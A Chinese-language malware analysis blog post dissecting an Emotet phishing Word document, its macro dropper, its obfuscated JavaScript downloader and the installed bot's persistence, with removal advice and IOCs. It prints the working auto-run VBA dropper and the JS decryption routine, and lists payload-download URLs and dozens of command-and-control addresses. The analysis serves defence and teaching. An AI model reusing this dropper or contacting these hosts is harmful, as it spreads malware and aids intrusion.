> 原文链接: https://www.anquanke.com//post/id/190180 


# 深入分析近期活跃Emotet家族木马


                                阅读量   
                                **1056766**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t01900dba0856736201.jpg)](https://p0.ssl.qhimg.com/t01900dba0856736201.jpg)



## 1 概述

Emotet在2014年6月被安全厂商趋势科技发现，据公开信息认为是Mealybug网络犯罪组织在运营，至今保持活跃。该家族由针对欧洲的银行客户的银行木马发展成为了对全球基础设施的僵尸网络，在攻与防的较量中，使用的的技术手法层出不穷。

近期，从开源威胁情报源观察到，Emotet僵尸网络恶意活动剧增，收集到了不同文件名的恶意Word文档，网上公开对该恶意家族的分析报告存在不少，但为了记录一下自己的学习过程，对一使用JS方式的恶意文档进行分析。

文章难免有误，如有错误，欢迎指正，如需文中样本，请留言，无偿提供。



## 2 入侵过程

黑客组织通过大量投放钓鱼邮件，广撒网方式，发送带有如“发票”、“付款”、“银行账户提醒”等诱惑性词的邮件附件，诱导用户查看Word文档。

在用户安全意识淡薄、出于好奇或与工作相似的情况，用户极易打开文档，还顺手点击启用一下宏，文档中也有提示，这种使用方法屡试不爽。如不启用宏，没有对计算机造成危害，但文档存在潜在威胁。

[![](https://p0.ssl.qhimg.com/t0151d9ae166adf4685.png)](https://p0.ssl.qhimg.com/t0151d9ae166adf4685.png)

图2-1 文档内容

用户启用宏后，一切都变了，在后台自动运行文档中的宏代码，释放在代码中的JS，该JS从C&amp;C服务器下载木马，实现对计算机持久化控制，进行数据窃取等网络威胁活动。

入侵过程如下图：

[![](https://p1.ssl.qhimg.com/t01373a9b2955d6c894.png)](https://p1.ssl.qhimg.com/t01373a9b2955d6c894.png)

图2-2 入侵过程



## 3 基本属性

在分析过程中，从新收集的恶意文档中发现使用PowerShell脚本的技术手段，此次是分析使用JS方式的恶意文档，基本信息如下表：

|文件名|INVOICE COPY REQUEST.doc
|------
|文件类型|Office Open XML Document
|文件大小|329.19 KB
|Magic|Zip archive data, at least v1.0 to extract
|MD5|6d17d8ff3d3247caa6a80e10e3b0dd12
|SHA-256|ed9b8afaa498f946a5aa4114b8a8d0d5a27ff46a1488af0cd46865660589051e
|SSDEEP|6144:ggLFYOH4zwjspGRcF0VmmiyrC3gbYMnHO6AK2Xn:ggLSOYzwjTRcJyrCM5HO66X
|是否使用宏|是

表2-1 文件基本信息



## 4 宏代码分析

查看（ALT+F11）使用的宏代码，有ThisDocument.cls、UserForm1.frx、NewMacros.bas三个文件，ThisDocument.cls使用了混淆技术混淆代码，定义了许多无用的变量，操作各变量运算，参杂在VBA代码里面，干扰分析，NewMacros.bas模块没有调用，且代码有错误。

[![](https://p3.ssl.qhimg.com/t016b3d7319109685d1.png)](https://p3.ssl.qhimg.com/t016b3d7319109685d1.png)

图4-1 宏代码文件

[![](https://p5.ssl.qhimg.com/t013fa2178fca5e56b8.png)](https://p5.ssl.qhimg.com/t013fa2178fca5e56b8.png)

图4-2部分混淆宏代码

去除混淆代码，简洁到十来行了。交给VBA代码的任务就是，获取嵌入在文本框的JS代码，随机JS文件名保存到” C:Users&lt;用户名&gt; Documents”目录下，然后运行。VBA代码详解如下：

```
Sub autoopen()                                    ‘启用宏后自动执行
    nsduisdisdu3                                  ’调用nsduisdisdu3函数
End Sub
Sub nsduisdisdu3()
    Randomize                                             ’随机数
    Set Ws = CreateObject("WScript.Shell")                ’创建WScript.Shell对象
    ipath = Ws.SpecialFolders("MyDocuments")              ‘获取MyDocuments文档路径
    wgregrgeg43hg3g34g43 = UserForm1.TextBox1.Value       ‘获取窗体文本框文本
    egegergg4g33g443g43g3g = ipath &amp; Chr(92) &amp; Rnd &amp; ".js"‘保存JS路径，JS文件名随机定义
    Open egegergg4g33g443g43g3g For Output As #96         ‘把文本框文本写入JS文件
    Print #96, wgregrgeg43hg3g34g43
    Close #96
    runFile egegergg4g33g443g43g3g                        ’调用runFile函数
End Sub
Sub runFile(runFile)
    Set fffffffffffffffffffffff3 = CreateObject("Shell.Application")’创建Shell.Application对象
    fffffffffffffffffffffff3.ShellExecute runFile                   ’运行JS文件
End Sub
```

窗体UserForm1.frx文件，可以看到文本框里有一长串字符串，经过分析可知是一段JS代码，如下图：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01b5b59ea7865fcc8c.png)

图4-3 窗体文本



## 5 JS分析

运行JS过程中，弹出一个文件格式不支持的警告提示框，误以为打开的文档出错了，如下图：

[![](https://p1.ssl.qhimg.com/t01192200e245d90e7f.png)](https://p1.ssl.qhimg.com/t01192200e245d90e7f.png)

图5-1 警告提示框

打开JS看到很凌乱，可通过“JS在线格式化”代码，看到字符串数组中大量经过base64编码的数据，首先解码试试，得到的是乱码，说明base64编码前还使用了加密算法处理。再分析代码是否给出了解密算法，我是把JS代码放在HTML通过Google一步步调试分析，确定字符串的解密过程的。

JS代码调试例子：

```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;&lt;/title&gt;
&lt;meta charset="utf-8"&gt;
&lt;script type="text/javascript"&gt;
var a = ['NwcMw7rDoA==', 'U8OLw7lVWg==',
复制js代码到该区域
……
&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
    JS调试大法！
&lt;/body&gt;
&lt;/html&gt;
```

代码执行过程，把字符串数组中前0xc3(195)个字符串逐个按顺序向数组末尾添加，”woPCv0Rxw4U=”转换为第一个开始解密，对应密钥是”Fz6s”，每个字符串都有一个密钥，需要一一对应。

JS解密算法，如下：

```
var b = function(d, a) `{`
    console.log(d, a);
    if (b['phtyIA'] === undefined) `{` (function() `{`
            var f = function() `{`
                var g;
                try `{`
                    g = Function('returnx20(function()x20' + '`{``}`.constructor(x22returnx20thisx22)(x20)' + ');')();
                `}` catch(h) `{`
                    g = window;
                `}`
                return g;
            `}`;
            var i = f();
            var j = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
            i['atob'] || (i['atob'] = function(k) `{`
                var l = String(k)['replace'](/=+$/, '');
                for (var m = 0x0,n, o, p = 0x0,q = ''; 
                o = l['charAt'](p++);~o &amp;&amp; (n = m % 0x4 ? n * 0x40 + o: o, m++%0x4) ? q += String['fromCharCode'](0xff &amp; n &gt;&gt; ( - 0x2 * m &amp; 0x6)) : 0x0) `{`
                    o = j['indexOf'](o);
                `}`
                return q;
            `}`);
        `}` ());
        var r = function(s, d) `{`
            var u = [],
            v = 0x0,
            w,
            x = '',
            y = '';
            s = atob(s);//base64解码
            for (var z = 0x0,A = s['length']; z &lt; A; z++) `{`
                //s转为URL编码
                y += '%' + ('00' + s['charCodeAt'](z)['toString'](0x10))['slice']( - 0x2);
            `}`
            s = decodeURIComponent(y);//URL解码
            for (var B = 0x0; B &lt; 0x100; B++) `{`
                u[B] = B;//0-255数值赋值给u数组
            `}`
            for (B = 0x0; B &lt; 0x100; B++) `{`
                //与密钥进行256次计算，赋值给u数组
                v = (v + u[B] + d['charCodeAt'](B % d['length'])) % 0x100;
                w = u[B];
                u[B] = u[v];
                u[v] = w;
            `}`
            B = 0x0;
            v = 0x0;
            for (var C = 0x0; C &lt; s['length']; C++) `{`
                B = (B + 0x1) % 0x100;
                v = (v + u[B]) % 0x100;
                w = u[B];
                u[B] = u[v];
                u[v] = w;
                x += String['fromCharCode'](s['charCodeAt'](C) ^ u[(u[B] + u[v]) % 0x100]);//取单个s字符数值与u[(u[B] + u[v]) % 0x100]异或，然后转字符
            `}`
            console.log(x);
            return x;//解密结果
        `}`;
        b['OxLJpA'] = r;
        b['phtyIA'] = !![];
    `}`
    e = b['OxLJpA'](a, d);
    return e;
`}`;
var result = b('Fz6s', 'woPCv0Rxw4U=');
```

部分数据解密结果，如下：

|加密数据|密钥|解密后
|------
|woPCv0Rxw4U=|Fz6s|JrUWR
|eSE+wqV1J8OWOzrDoMOVDsKVMcORHsOnSAbChcK2wqXCt8K9VA==|zZJe|Not Supported File Format
|AsKTwqZOwrfDlmMuDj51wr/CmCYrYSHCosOvw6VGVsKWNw4EcsKtAS88R1PDpGzCmMO9wr7Dh3XDmsKkwo91Aw/DoWTCpXwhCxPCp8KZ JGR8w6zDtsOqwpk1bMOdw7rDjMKTw6Aow4/DhsOywq8DWsKXM8K4w7A4PsKxwovDkcKmw54tLG7DlcKrwoxIJD/DgsO3wpLChkM+d0IbMl7 DvQQMB1fCpE7DscOwAsKQEMK+wr82w57DusKcB8K0D8Ohw5JLLD3CncKtwqxhNzvDk8K1w4vDpsKXEsKZw4Apw5HDmx3CmMOAw5bDrR nDvcK9QHgFwpEZFcOBwozCnA==|lgjt|There was an error opening this document. The file is damaged and could not be repaired (for example, it was sent as an email attachment and wasn’t correctly decoded).
|w6I2w79FGAdUw75GVMOcYsKBegdoElg7EynDkcOrb07Di8OKwrPCnGXCv8K7w4UpQSzCpifChX/DkMKYwoMza8O2XCAjw6E9|Rinw|[http://barcaacademyistanbul[.]com/wp-admin/MozLqtMPp/](http://barcaacademyistanbul%5B.%5Dcom/wp-admin/MozLqtMPp/)
|w6I2w79FGAdUw6xGS8Oab8KBdARtBVsnDi7DhsOldELDjcODw7HClmTCtcK6w5E2AWLCtTrDgXLCkMK7wpgsScOzBwMVw55Bw5XDsCk=|Rinw|[http://pamelambarnettcounseling[.]com/wp-content/nfOSEw/](http://pamelambarnettcounseling%5B.%5Dcom/wp-content/nfOSEw/)
|fynDsUTCkcKvcMOWw5jCvSLDiMKxw6bCgTkTwrE7X8K/w4Baw4VJw4NWAEktw7XCqzRgwo9Ow5bCv8KARENrfMOvwqFrw7TDl8KqwqM=|Ph6W|[http://blog.lalalalala[.]club/bhx/y18ta-kk6t55-2894/](http://blog.lalalalala%5B.%5Dclub/bhx/y18ta-kk6t55-2894/)
|J8KNEi/CnXZcWR7CgAo+wp8cw5PCmMOiw4jCvsOMw4bDvsOrw7LDtknDiH1tfyHCvnUxecKZwpzDjcKOw7nDnRfCscKgw4BDwppmwpYLwpo=|%[@P](https://github.com/P)$|[http://www.kokuadiaper[.]com/ozcd/ld0-u7t3ym4j7h-903/](http://www.kokuadiaper%5B.%5Dcom/ozcd/ld0-u7t3ym4j7h-903/)
|GSsyw6A=|zZJe|.exe
|w4tGw503w4zDg8KuwqnDnMKtw57DmAfDhHHDvlMzw6zDlMKTwqvDg8KMLAQ=|S4vY|Scripting.FileSystemObject

表5-1部分数据解密结果

此JS文件重要信息包括执行代码都经过了加密，放到一个数组里。执行解密后，通过内置的4个恶意软件下载链接（http://blog.lalalalala[.]club/bhx/y18ta-kk6t55-2894/、http://pamelambarnettcounseling[.]com/wp-content/nfOSEw/、http://www.kokuadiaper[.]com/ozcd/ld0-u7t3ym4j7h-903/、http://barcaacademyistanbul[.]com/wp-admin/MozLqtMPp/），从中选择一个能使用的站点Get请求下载Emotet恶意软件，下载的y18ta-kk6t55-2894是一个可执行exe文件，然后通过调用WScript.Shell运行。

[![](https://p4.ssl.qhimg.com/t019a15b0ff2e0a7921.png)](https://p4.ssl.qhimg.com/t019a15b0ff2e0a7921.png)

图5-2 下载恶意软件



## 6 行为分析

Emotet恶意软件运行后，创建“reportdurable.exe”进程。

[![](https://p4.ssl.qhimg.com/t019ede50e669c84694.png)](https://p4.ssl.qhimg.com/t019ede50e669c84694.png)

图6-1 恶意软件进程

把自身复制到“C:WindowsSysWOW64”系统目录下然后删除，隐藏在系统文件中。

[![](https://p1.ssl.qhimg.com/t01f93d85490095b52b.png)](https://p1.ssl.qhimg.com/t01f93d85490095b52b.png)

图6-2 备份目录

查看Emotet恶意软件属性，伪装成了微软系统程序，除了日期没重置和系统文件相同，加上目录特殊，干扰分析人员判断。

[![](https://p4.ssl.qhimg.com/t0168f61bf7d8c0430d.png)](https://p4.ssl.qhimg.com/t0168f61bf7d8c0430d.png)

图6-3 详细信息

添加“reportdurable”服务随系统服务启动，防止系统重启失效，达到长期有效驻留在系统，服务描述信息“BDESVC 承载 BitLocker 驱动器加密服务。BitLocker 驱动器加密为操作系统提供安全启动保障，并为 OS、固定卷和可移动卷提供全卷加密功能。使用此服务，BitLocker 可以提示用户执行与已安装卷相关的各种操作，并自动解锁卷而无需用户交互。此外，它还会将恢复信息存储至 Active Directory (如果这种方法可用并且需要这样做)，并确保使用最近的恢复证书。停止或禁用该服务可以防止用户使用此功能”。

[![](https://p0.ssl.qhimg.com/t01e50d393afb15b2aa.png)](https://p0.ssl.qhimg.com/t01e50d393afb15b2aa.png)

图6-4 服务项

与C&amp;C服务器通信，Emotet恶意软件使用了多个（共39个）C&amp;C地址，通过RSA公钥加密再用base64编码把受害主机信息发送到C&amp;C服务器。

RSA公钥如下：

```
-----BEGIN PUBLIC KEY----- 

MHwwDQYJKoZIhvcNAQEBBQADawAwaAJhAM426uN11n2LZDk/JiS93WIWG7fGCQmP4h5yIJUxJwrjwtGVexCelD2WKrDw9sa/xKwmQKk3b2fUhwnHXjoSpR7pLaDo7pEc iJB5y6hjbPyrSfL3Fxu74M2SAS0Arj3uAQIDAQAB 

-----END PUBLIC KEY-----
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01a008885478dd6003.png)

图6-5 网络流量



## 7 处置方法

Emotet恶意软件的清除，从服务项和系统程序目录两个方面着手，一是删除reportdurable服务配置“HKEY_LOCAL_MACHINESYSTEMControlSet001servicesreportdurable”，二是清除恶意文件根源，确定当时打开中毒的恶意Word，删除“C:WindowsSysWOW64” 目录下的reportdurable文件和“C:Users&lt;用户名&gt; Documents”目录下的js文件。



## 8 防御措施

1）使用网络安全产品，在网络设备上配置黑名单拦截。

2）定期使用杀毒软件对全盘查杀，查杀前更新病毒库。

3）对来历不明的邮件附件或链接，不随意点击。

4）禁用office宏，如提示启用，请留意该文档的恶意性。

5）多关注网络安全动态，提高个人网络安全意识。



## 9 IOCs

相关样本：

6D17D8FF3D3247CAA6A80E10E3B0DD12（Word文档INVOICE COPY REQUEST.doc）

45C4092184D290E23C2DFD45E823BF8A（Emotet恶意软件reportdurable.exe）

FD2EE5A722AEE467B15D99545477545F（.3534052.js）

恶意软件下载地址：

[http://blog.lalalalala[.]club/bhx/y18ta-kk6t55-2894/](http://blog.lalalalala%5B.%5Dclub/bhx/y18ta-kk6t55-2894/)

[http://pamelambarnettcounseling[.]com/wp-content/nfOSEw/](http://pamelambarnettcounseling%5B.%5Dcom/wp-content/nfOSEw/)

[http://www.kokuadiaper[.]com/ozcd/ld0-u7t3ym4j7h-903/](http://www.kokuadiaper%5B.%5Dcom/ozcd/ld0-u7t3ym4j7h-903/)

[http://barcaacademyistanbul[.]com/wp-admin/MozLqtMPp/](http://barcaacademyistanbul%5B.%5Dcom/wp-admin/MozLqtMPp/)

信息回传地址：

[http://62.75.171[.]248:7080/acquire/scripts/between/merge/](http://62.75.171%5B.%5D248:7080/acquire/scripts/between/merge/)

[http://62.75.171[.]248:7080/add/tlb/between/](http://62.75.171%5B.%5D248:7080/add/tlb/between/)

[http://62.75.171[.]248:7080/tpt/](http://62.75.171%5B.%5D248:7080/tpt/)

[http://62.75.171[.]248:7080/enable/](http://62.75.171%5B.%5D248:7080/enable/)

[http://62.75.171[.]248:7080/prep/](http://62.75.171%5B.%5D248:7080/prep/)

[http://62.75.171[.]248:7080/window/arizona/](http://62.75.171%5B.%5D248:7080/window/arizona/)

[http://62.75.171[.]248:7080/codec/](http://62.75.171%5B.%5D248:7080/codec/)

[http://62.75.171[.]248:7080/srvc/nsip/ringin/merge/](http://62.75.171%5B.%5D248:7080/srvc/nsip/ringin/merge/)

[http://149.202.153[.]251:8080/img/site/site/merge/](http://149.202.153%5B.%5D251:8080/img/site/site/merge/)

[https://203.150.19[.]63/prov/loadan/](https://203.150.19%5B.%5D63/prov/loadan/)

[http://95.178.241[.]254:465/merge/child/](http://95.178.241%5B.%5D254:465/merge/child/)

[http://216.154.222[.]52:7080/mult/](http://216.154.222%5B.%5D52:7080/mult/)

[http://133.130.73[.]156:8080/acquire/entries/site/](http://133.130.73%5B.%5D156:8080/acquire/entries/site/)

[http://178.32.255[.]133:443/whoami.php等](http://178.32.255%5B.%5D133:443/whoami.php%E7%AD%89)

C&amp;C地址：

190.79.251.99:21

189.245.216.217:143

189.189.214.1:21

62.75.171.248:7080

133.130.73.156:8080

203.150.19.63:443

216.154.222.52:7080

149.202.153.251:8080

5.189.148.98:8080

83.110.75.153:8090

95.178.241.254:465

190.55.39.215:80

70.45.30.28:80

181.230.126.152:8090

83.169.33.157:8080

190.55.86.138:8443

201.113.23.175:443

113.52.135.33:7080

139.59.242.76:8080

190.171.105.158:7080

176.58.93.123:80

190.13.146.47:443

143.95.101.72:8080

138.197.140.163:8080

190.10.194.42:8080

190.92.103.7:80

78.109.34.178:443

45.33.1.161:8080

108.179.216.46:8080

152.168.220.188:80

159.69.211.211:7080

94.177.253.126:80

93.78.205.196:443

190.146.81.138:8090

46.32.229.152:8080

181.113.229.139:990

178.249.187.150:7080

216.70.88.55:8080

200.82.147.93:7080



## 10 参考

[1] [2019-09-23，Emotet家族僵尸网络活动激增，谨慎打开来源不明邮件](https://www.freebuf.com/column/215015.html)

[2] [2019-06-20，EMOTET深度分析](https://xz.aliyun.com/t/5436)

[3] [2019-02-27，深入分析恶意软件 Emotet 的最新变种](https://xz.aliyun.com/t/4176)
